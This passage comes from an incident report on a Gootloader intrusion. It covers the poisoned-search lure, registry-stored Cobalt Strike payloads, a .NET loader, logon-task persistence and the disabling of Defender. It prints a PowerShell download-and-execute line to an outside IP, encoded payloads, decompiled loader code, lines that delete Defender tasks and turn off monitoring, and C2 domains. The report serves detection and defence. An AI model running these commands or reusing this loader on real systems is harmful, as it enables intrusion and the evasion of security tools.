@kostastsale, @iiamaleks, @pigerlin.\n\n## Initial Access\n\nThe threat actor gained initial access using Gootloader malware. Here’s a video of the user searching and downloading the malware via the poisoned SEO search.\n\n[GootLoader Download](https://www.youtube.com/embed/IdR-tlv7w48?feature=oembed)\n\nThe Javascript file is then executed when double-clicked after the zip is opened.\n\n```image\nAlt: Execution\nDescription: The image depicts a screenshot of a software interface displaying a Windows Registry Editor. On the left side, there are various folders under the path 'HKCU:\\SOFTWARE\\Microsoft\\Phone\\Username', which include 'Phone', 'ShellUI', 'Pim', 'Poom', 'Remote Assistance', 'ScreenMagnifier', 'Sensors', and 'SkyDrive'. The right side shows a table with registry entries labeled '(default)' and indexed rows (0 to 7), containing values that appear to be obfuscated strings. This information is relevant to the analysis of the execution of Gootloader malware, suggesting a technical aspect of the malware's operation.\n```\n\n## Execution\n\nGootloader upon execution creates two registry keys:\n\n```\nHKCU:\\SOFTWARE\\Microsoft\\Phone\\Username\nHKCU:\\SOFTWARE\\Microsoft\\Phone\\Username0\n```\n\nThe first is populated with an encoded Cobalt Strike payload and the latter is used to store a .NET loader named `powershell.dll`.\n\n```image\nAlt: Registry Keys\nDescription: The image displays a screenshot of a Windows Registry Editor, showing the registry path 'HKCU:\\SOFTWARE\\Microsoft\\Phone\\Username0'. It contains a list of registry values with associated data types and values. The left pane shows the key hierarchy, specifically the 'Phone' key and its subkeys, while the right pane details the values stored in 'Username0', indicating the presence of encoded data related to the Gootloader malware. This is relevant for understanding the malware's execution and persistence mechanisms.\nTranscription: |\n  Key name\n  HKCU:\\SOFTWARE\\Microsoft\\Phone\\Username0\n  \n  Value Name    Value Type    Data\n  (default)     RegSz         \n  0             RegSz         4d5a90000300000004000000ffff0000b8000...\n  1             RegSz         65a6a586d280700002b0d0012037b1b0004a...\n  2             RegSz         00006e282900000a00120209281e00000a7d...\n  3             RegSz         7f01140003004c250000000000086008b011...\n  4             RegSz         64e616d654f7264696e616c730048696e740...\n  5             RegSz         e33320526567697374727920790052656773...\n  6             RegSz         000000000000000000000000000000000000...\n```\n\nFollowing the Registry events, a PowerShell command was launched executing an encoded command.\n\n```image\nAlt: PowerShell Command\nDescription: The image displays a table summarizing key event details related to a cybersecurity incident. It includes columns for 'EventCode', 'TaskCategory', 'ParentCommandLine', and 'CommandLine'. The 'Process Create' event shows the execution of 'C:\\Windows\\System32\\WScript.exe' and a PowerShell command executing a potentially encoded payload from a specified file path.\nTranscription: |\n  plaintext\n  EventCode   TaskCategory       ParentCommandLine                                                                                                          CommandLine\n  1           Process Create     \"C:\\Windows\\System32\\WScript.exe\"                                                                                          \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" /c C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe \"/e\"\n              (rule:             \"C:\\Users\\[REDACTED]\\AppData\\Local\\Temp\\Temp1_olympus plea agreement(46196).zip\\olympus_plea_agreement 34603.js\"            NgAxA\"DQANgA0ADkA\"MgAxADEA0WB\"zAGwAZQBlAHAAIAAtAHMAIAAA4AD\"MA\"OwAkAG8AcABqAD0ARwBlAH\"QA\"LQB5AHQ\"AZQBtAFAA\"cg\"B\"vAHAaZQ\"ByA\"HQAeQ\"Ag\"AC0\"AcABh\"AH\"QAaA\n              ProcessCreate)\n```\n\n```\n\"powershell.exe\" /c C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe \"/\"e\" NgAxA\"DQANgA0ADkA\"MgAxADEAOwB\"zAGwAZQBlAHAAIAAtAHMAIAA4AD\"MA\"OwAkAG8AcABqAD0ARwBlAH\"...\n```\n\nThe PowerShell command will extract the .NET loader from `HKCU:\\SOFTWARE\\Microsoft\\Phone\\Username0` and execute the code in memory via `Assembly.Load()`.\n\nThis CyberChef recipe can be used to decode the related PS encoded payload.\n\nOnce the PowerShell script is finished running, the next stage involves the .NET loader. The .NET loader will read `HKCU:\\SOFTWARE\\Microsoft\\Phone\\Username` and extract the encoded Cobalt Strike payload. This payload will be decoded and subsequently loaded into memory for execution.\n\nA simple encoding scheme is used where a letter will correspond to one of the hex characters (0-F), or alternately three zeros.\n\n```\nq->000\nv->0\nw->1\nr->2\nt->3\ny->4\nu->5\ni->6\no->7\np->8\ns->9\nq->A\nh->B\nj->C\nk->D\nl->E\nz->F\n```\n\n```image\nAlt: .NET Loader\nDescription: The image depicts a code snippet written in C#. It outlines a method for reading encoded data from the Windows registry, decoding it, and loading it into memory for execution. The code includes comments and structured sections labeled as '1. Read encoded data from registry,' '2. Decode data,' and '3. Load into memory and run.' The use of specific classes like `RegistryKey` and `Open.DynamicDllLoader` indicates a focus on manipulating system resources, typical in the context of cyber threat intelligence.\nTranscription: |\n  csharp\n  // Token: 0x60000002 RID: 2 RVA: 0x00002104 File Offset: 0x00000304\n  public static string Test()\n  {\n      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(\"SOFTWARE\\\\Microsoft\\\\Phone\\\\\" +\n          Environment.UserName);\n      if (registryKey != null)\n      {\n          string text = \"\";\n          for (int i = 0; i < 99999; i++)\n          {\n              string text2 = \"\";\n              try\n              {\n                  text2 = registryKey.GetValue(i.ToString()).ToString();\n              }\n              catch\n              {\n              }\n              if (text2.Length == 0)\n              {\n                  break;\n              }\n              text += text2;\n          }\n          registryKey.Close();\n          \n          // 2. Decode data\n          text = text.Replace(\"q\", \"0\").Replace(\"v\", \"0\").Replace(\"w\", \"1\").Replace(\"r\", \"2\").Replace(\"t\", \"3\").Replace(\"y\", \"4\").Replace(\"u\", \"5\").Replace(\"i\", \"6\").Replace(\"o\", \"7\").Replace(\"p\", \"8\").Replace(\"s\", \"9\").Replace(\"g\", \"A\").Replace(\"h\", \"B\").Replace(\"j\", \"C\").Replace(\"k\", \"D\").Replace(\"l\", \"E\").Replace(\"z\", \"F\");\n          byte[] data = Open.STBA(text);\n          Open.DynamicDllLoader dynamicDllLoader = new Open.DynamicDllLoader();\n          bool flag = dynamicDllLoader.LoadLibrary(data);\n          Console.WriteLine(\"Loaded: \" + flag);\n          if (flag)\n          {\n              uint procAddress = dynamicDllLoader.GetProcAddress(\"mono_trace\");\n              Console.WriteLine(\"Handle: \" + procAddress);\n          }\n      }\n      Console.ReadKey();\n      return \"Install\";\n  }\n```\n\nThe below diagram summarizes the Gootloader initial execution.\n\n```image\nAlt: Execution Summary\nDescription: The image is a flowchart illustrating the execution process of the Gootloader. It outlines the steps involved, starting from the initial execution of the malicious script (`wscript.exe olympus_plea_agreement 34603.js`), which contacts the command and control (C2) servers to retrieve the payload. It details how the Gootloader writes a .NET loader and an encoded Cobalt Strike payload to the registry, and how the PowerShell command is executed to load the .NET loader. The diagram also highlights how the .NET loader subsequently reads and decodes the Cobalt Strike payload from the registry for execution.\nTranscription: |\n  plaintext\n  https://junk-bros.com\n  https://jp.imonitorsoft.com\n  https://kakiosk.adsparkdev.com\n  \n  wscript.exe olympus_plea_agreement 34603.js\n      Gootloader contacts C2 and pulls down payload\n  \n  powershell.exe\n      .NET loader read from registry and loaded in Powershell via Assembly.Load() using an encoded Powershell command\n      The same encoded Powershell command is added as a scheduled task to run on user logon\n  \n  .NET loader and encoded Cobalt Strike payload written to registry\n      .NET Loader -> HKCU:\\SOFTWARE\\Microsoft\\Phone\\Username0\n      Cobalt Strike -> HKCU:\\SOFTWARE\\Microsoft\\Phone\\Username\n  \n  .NET Loader\n      .NET loader is executed which reads and decodes a Cobalt Strike payload from the registry\n      .NET loader loads and executes the Cobalt Strike payload\n```\n\nAn excellent resource from Microsoft describes a set of configurations that can be applied to Windows that can stop `.js` files from executing, preventing this attack chain from ever getting off the ground.\n\nDuring later stages of the intrusion, Cobalt Strike was executed interactively through RDP on multiple systems.\n\n```\npowershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('hxxp://37.120.198.225:80/trio'))\"\n```\n\n## Persistence\n\nThe Javascript (Gootloader) file invoked an encoded PowerShell command.\n\n```image\nAlt: PowerShell Command\nDescription: The image displays a log entry or data table showing details of a process creation event related to a PowerShell command. It includes columns for EventCode, TaskCategory, ParentImage, and CommandLine. The CommandLine specifies a PowerShell script execution through the Windows Script Host (wscript.exe), indicating the use of encoded commands. This image provides technical insight into the execution of potentially malicious PowerShell commands, relevant for understanding cyber threats.\nTranscription: |\n  plaintext\n  EventCode: 1\n  TaskCategory: Process Create (rule: ProcessCreate)\n  ParentImage: C:\\Windows\\System32\\wscript.exe\n  CommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" /c C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe \"/e\" N\"g\"A4\"ADc\"ANgA4\"ADEAMwA7ACQAYQ\"A9ACIA\"TgB\"n\"AEEAeAB\"B\"AE\"Q\"AUQ\"BBAE\"4ZwBBADA\"AQ\"QBEAGsAQQ\"BNAGc\"AQDBA4\"EEARABF\"AE\"E\"AT\"w\"B3A\"ETIAegBB\"AEc\"AdvBBA\"F\"oAUQBC\"AGwA\"Q\"Q\"B\"IAEEAQ\"\n```\n\nThe encoded PowerShell command creates a Scheduled Task that executes when the selected user logs on to the computer. An encoded PowerShell command is executed that will retrieve and execute the payload stored in the Registry.\n\n```\n6876813;\n$a=\"NgAxADQANgA0ADkAMgAxADEAOwBzAGwAZQBlAHAAIAAtAHMAIAA4ADMAOwAkAG8AcABqAD0ARwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AcABhAHQAaAAgACgAIgBoAGsAIgArACIAYwB1ADoAXABzAG8AZgAiACsAIgB0AHcAIgArACIAYQByAGUAXABtAGkAYwAiACsAIgByAG8AcwAiACsAIgBvAGYAdABcAFAAaABvAG4AZQBcACIAKwBbAEUAbgB2AGkAcgBvAG4AbQBlAG4AdABdADoAOgAoACIAdQBzAGUAIgArACIAcgBuACIAKwAiAGEAbQBlACIAKQArACIAMAAiACkAOwBmAG8AcgAgACgAJAB1AG8APQAwADsAJAB1AG8AIAAtAGwAZQAgADcANgAwADsAJAB1AG8AKwArACkAewBUAHIAeQB7ACQAbQBwAGQAKwA9ACQAbwBwAGoALgAkAHUAbwB9AEMAYQB0AGMAaAB7AH0AfQA7ACQAdQBvAD0AMAA7AHcAaABpAGwAZQAoACQAdAByAHUAZQApAHsAJAB1AG8AKwArADsAJABrAG8APQBbAG0AYQB0AGgAXQA6ADoAKAAiAHMAcQAiACsAIgByAHQAIgApACgAJAB1AG8AKQA7AGkAZgAoACQAawBvACAALQBlAHEAIAAxADAAMAAwACkAewBiAHIAZQBhAGsAfQB9ACQAeQBsAD0AJABtAHAAZAAuAHIAZQBwAGwAYQBjAGUAKAAiACMAIgAsACQAawBvACkAOwAkAGsAagBiAD0AWwBiAHkAdABlAFsAXQBdADoAOgAoACIAbgBlACIAKwAiAHcAIgApACgAJAB5AGwALgBMAGUAbgBnAHQAaAAvADIAKQA7AGYAbwByACgAJAB1AG8APQAwADsAJAB1AG8AIAAtAGwAdAAgACQAeQBsAC4ATABlAG4AZwB0AGgAOwAkAHUAbwArAD0AMgApAHsAJABrAGoAYgBbACQAdQBvAC8AMgBdAD0AWwBjAG8AbgB2AGUAcgB0AF0AOgA6ACgAIgBUAG8AQgAiACsAIgB5AHQAZQAiACkAKAAkAHkAbAAuAFMAdQBiAHMAdAByAGkAbgBnACgAJAB1AG8ALAAyACkALAAoADIAKgA4ACkAKQB9AFsAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvACIAKwAiAGEAZAAiACkAKAAkAGsAagBiACkAOwBbAE8AcABlAG4AXQA6ADoAKAAiAFQAZQAiACsAIgBzAHQAIgApACgAKQA7ADYAMQAxADgAOQA4ADUANAA0ADsA\";\n```\n\nThe task created from the PowerShell script:\n\n```image\nAlt: Scheduled Task\nDescription: The image displays an XML representation of a scheduled task created by a PowerShell script. The task is set to trigger when a specific user logs on. Key elements include the task's registration information, triggers, settings, actions, and user principal details. The XML schema indicates various properties such as logon type, execution parameters, and security context, which are relevant to the execution of the PowerShell command.\nTranscription: |\n  xml\n  <?xml version=\"1.0\" encoding=\"UTF-16\"?>\n  <Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n    <RegistrationInfo>\n      <URI>\\</URI>\n    </RegistrationInfo>\n    <Triggers>\n      <LogonTrigger>\n        <Enabled>true</Enabled>\n        <UserId></UserId>\n      </LogonTrigger>\n    </Triggers>\n    <Settings>\n      <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n      <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>\n      <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>\n      <AllowHardTerminate>true</AllowHardTerminate>\n      <StartWhenAvailable>false</StartWhenAvailable>\n      <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\n      <IdleSettings>\n        <Duration>PT10M</Duration>\n        <WaitTimeout>PT1H</WaitTimeout>\n        <StopOnIdleEnd>true</StopOnIdleEnd>\n        <RestartOnIdle>false</RestartOnIdle>\n      </IdleSettings>\n      <AllowStartOnDemand>true</AllowStartOnDemand>\n      <Enabled>true</Enabled>\n      <Hidden>false</Hidden>\n      <RunOnlyIfIdle>false</RunOnlyIfIdle>\n      <WakeToRun>false</WakeToRun>\n      <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>\n      <Priority>7</Priority>\n    </Settings>\n    <Actions Context=\"Author\">\n      <Exec>\n        <Command>C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe</Command>\n        <Arguments>-w -n -e \n```\n\n## Defense Evasion\n\nWindows Defender scheduled scans were deleted from the system. This was observed on multiple servers the threat actor pivoted to.\n\n```image\nAlt: Windows Defender\nDescription: The image displays a textual output from a process creation log, detailing the execution of the 'schtasks.exe' command. This command was used to delete scheduled tasks related to Windows Defender, indicating a potential evasion of security measures. Key elements include the process ID, command line executed, user information, and hash values for verification. The context suggests this is part of a larger discussion on defense evasion tactics employed by threat actors.\nTranscription: |\n  plaintext\n  \"Process Create:\n  RuleName: technique_id=T1086,technique_name=PowerShell\n  UtcTime:\n  ProcessGuid: {c26db5f6-5adc-61f9-f631-000000000060}\n  ProcessId:  3688\n  Image: C:\\Windows\\System32\\schtasks.exe\n  FileVersion:\n  Description: Task Scheduler Configuration Tool\n  Product: Microsoft Windows Operating System\n  Company: Microsoft Corporation\n  OriginalFileName: schtasks.exe\n  CommandLine: \"C:\\Windows\\system32\\schtasks.exe\" /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" /f\n  CurrentDirectory: C:\\Users\\\n  User:\n  LogonGuid: {c26db5f6-901c-61a3-bdad-030000000000}\n  LogonId: 0x3ABD8\n  TerminalSessionId: 1\n  IntegrityLevel: High\n  Hashes: SHA1=EF173058B6BD8AB7E07C1A56B63A9E504E463D2DA,MD5=8AC868920214321438EABFBDE93BC2,SHA256=1AC5741B075111E49CB1681BD3A00EEF9B03F\n  ParentProcessGuid: {c26db5f6-5aa1-61f9-e731-000000000060}\n  ParentProcessId: 9724\n  ParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n  ParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" \"\n```\n\n```\nschtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" /f\nschtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance\" /f\nschtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup\" /f\nschtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Verification\" /f\n```\n\nFurthermore, PowerShell was used to disable multiple security features built into Microsoft Defender.\n\n```\nSet-MpPreference -DisableRealtimeMonitoring $true\nSet-MpPreference -DisableArchiveScanning $true\nSet-MpPreference -DisableBehaviorMonitoring $true\nSet-MpPreference -DisableIOAVProtection $true\nSet-MpPreference -DisableIntrusionPreventionSystem $true\nSet-MpPreference -DisableScanningNetworkFiles $true\nSet-MpPreference -MAPSReporting 0\nSet-MpPreference -DisableCatchupFullScan $True\nSet-MpPreference -DisableCatchupQuickScan $True\n```\n\nAs in many cases involving Cobalt Strike, we observed rundll32 used to load the Cobalt Strike beacons into memory on the beachhead host.\n\n```image\nAlt: Memory Dump\nDescription: The image displays a table containing three rows and three columns. The columns are labeled 'Action Type', 'Initiating Process File Name', and 'Initiating Process Command Line'. Each row corresponds to actions involving the process 'rundll32.exe', detailing the type of action (such as 'RemoteSetThreadContextMemoryExecution' and 'RemoteExecutable MemoryAllocation') performed by or related to this process. This data is relevant to understanding the behavior of the threat actor's tools during a cyber intrusion.\nTranscription: |\n  Action Type                                      Initiating Process File Name    Initiating Process Command Line\n  RemoteSetThreadContextMemoryExecution            rundll32.exe                    rundll32.exe\n  RemoteExecutableMemoryAllocation                 rundll32.exe                    rundll32.exe\n  RemoteExecutableMemoryAllocation                 rundll32.exe                    rundll32.exe\n```\n\nThis can be observed in the memory dump from the beachhead host with the tell-tale `PAGE_EXECUTE_READWRITE` protection settings on the memory space and MZ headers observable in the process memory space.\n\n```image\nAlt: Memory Dump\nDescription: The image is a screenshot of a memory dump, showing hexadecimal machine code and memory addresses related to the execution of `rundll32.exe`. Key elements include indications of `PAGE_EXECUTE_READWRITE` memory protection settings and `MZ` headers, which are characteristic of executable files. The layout consists of lines of code displaying function calls and memory operations, with specific highlights on the memory protection status and executable identifiers.\nTranscription: |\n  08 4a 40 d1 c7 7e 7f 00 00  J...@..~...\n  3420    rundll32.exe          0x3030000    0x3063fff    VadS    PAGE_EXECUTE_READWRITE    52    1    Disabled\n  ...\n  50 52 55 56 57 8b ec 83 ec 0c  MZRE.\n  c3 5a 52 5e 68 00 00 00 00 68  .Z^h....h\n  c3 5a 5f 5d 0f 45 68 00 00 00  .Z_]..Eh...\n  ...\n  0x3030002:    dec    ebp\n  0x3030003:    pop    ecx\n  0x3030004:    push   ebp\n  0x3030005:    inc    ebp\n  0x3030006:    push   0x303009\n  0x303000b:    pop    ebx\n  0x303000c:    add    ebx, ebx\n  0x303000e:    mov    esp, esp\n  0x3030010:    mov    ebp, esp\n  0x3030012:    push   0x7d445\n  0x3030017:    call   0x56a2b5f0\n  ...\n  0x3030021:    push   edi\n  0x3030022:    call   eax\n  0x3030024:    add    byte ptr [eax], al\n  0x3030026:    add    byte ptr [eax], al\n  0x3030028:    add    byte ptr [eax], al\n  0x303002a:    add    byte ptr [eax], al\n  0x303002c:    add    byte ptr [eax], al\n  0x303002e:    add    byte ptr [eax], al\n  0x3030030:    add    byte ptr [eax], al\n  0x3030032:    add    byte ptr [eax], al\n  0x3030034:    add    byte ptr [eax], al\n  0x3030036:    add    byte ptr [eax], al\n  0x3030038:    add    byte ptr [eax], al\n  3420    rundll32.exe          0x3260000    0x329dfff    VadS    PAGE_EXECUTE_READWRITE    62    1    Disabled\n  ...\n  50 52 55 56 57 8b ec 83 ec 0c  MZRE.\n  c3 5a 52 5e 68 00 00 00 00 68  .Z^h....h\n  c3 5a 5f 5d 0f 45 68 00 00 00  .Z_]..Eh...\n  ...\n  0x3260001:    pop    edx\n  0x3260002:    dec    ebp\n  0x3260003:    pop    ecx\n  0x3260004:    push   ebp\n  0x3260005:    inc    ebp\n  0x3260006:    push   0x3260009\n  0x326000b:    pop    ebx\n  0x326000c:    add    ebx, ebx\n  0x326000e:    mov    esp, esp\n  0x3260010:    mov    ebp, esp\n  0x3260012:    push   0x7d445\n  0x3260017:    call   0x56a2b5f0\n  ...\n  0x3260021:    push   edi\n  0x3260022:    call   eax\n  0x3260024:    add    byte ptr [eax], al\n  0x3260026:    add    byte ptr [eax], al\n  0x3260028:    add    byte ptr [eax], al\n  0x326002a:    add    byte ptr [eax], al\n  0x326002c:    add    byte ptr [eax], al\n  0x326002e:    add    byte ptr [eax], al\n  0x3260030:    add    byte ptr [eax], al\n  0x3260032:    add    byte ptr [eax], al\n  0x3260034:    add    byte ptr [eax], al\n  0x3260036:    add    byte ptr [eax], al\n  0x3260038:    add    byte ptr [eax], al\n  7132    rundll32.exe          0xa700000    0xa90fff    VadS    PAGE_EXECUTE_READWRITE    33    1    Disabled\n  ...\n  4d 5a 90 00 03 00 00 00 04 00  MZARUH.\n  bd 1f 4c ef 20 00 00 00 00 00  ..L. ....\n  ...\n  a8 81 c1 f2 00 00 00 00 00 00  ..........\n  ...\n  03 5a 6f f1 01 48 00 00 00 00  .Zo..H....\n  ...\n  5a ff d3 00 00 00 00 00 00 00  Z.........\n  0xa700000:    pop    r10\n```\n\nDuring the intrusion, we observed various named pipes utilized by the threat actor’s Cobalt Strike beacons including default Cobalt Strike named pipes.\n\n```\nPipeName: \\msagent_ld\nPipeName: \\1ea887\n```\n\nThe threat actors were observed making use of double encoded Powershell commands. The first layer of encoding contains Hexadecimal and XOR encoding.\n\n```image\nAlt: Encoded Powershell\nDescription: The image displays a detailed output from a PowerShell process creation event. It includes various technical attributes such as the Process GUID, Process ID, image path, file version, description, and command line used. The command line contains obfuscated code involving hexadecimal values, indicating potential malicious intent. Additionally, it lists user information, terminal session ID, integrity level, and hash values related to the process, showcasing the technical details of the executed PowerShell command.\nTranscription: |\n  plaintext\n  \"Process Create:\n  RuleName: technique_id=T1086,technique_name=PowerShell\n  UtcTime: \n  ProcessGuid: {bb28eb5f-a41e-61f9-8445-000000000508}\n  ProcessId: 6268\n  Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n  FileVersion: \n  Description: Windows PowerShell\n  Product: Microsoft Windows® Operating System\n  Company: Microsoft Corporation\n  OriginalFileName: PowerShell.EXE\n  CommandLine: powershell -nop -non -ep bypass -w h -c \"&([scriptblock]::Create(([0x34,0x73,0x2d,0x5e,0x75,0x67,0x3d,0x5f,0x72,0x7a,0x75,0x6d,0x64,0x30,0x53,0x7f,0x7d,0x7c,0x3e,0x43,0x75,0x62,0x66,0x75,0x6f,0x2c,0x8d,0x7c,0x58,0x64,0x64,0x6e,0x75,0x6e,0x38,0x37,0x55,0x44,0x3c,0x37,0x8c,0x37,0x68,0x74,0x68,0x6e,0x43,0x75,0x6f,0x75,0x6d,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x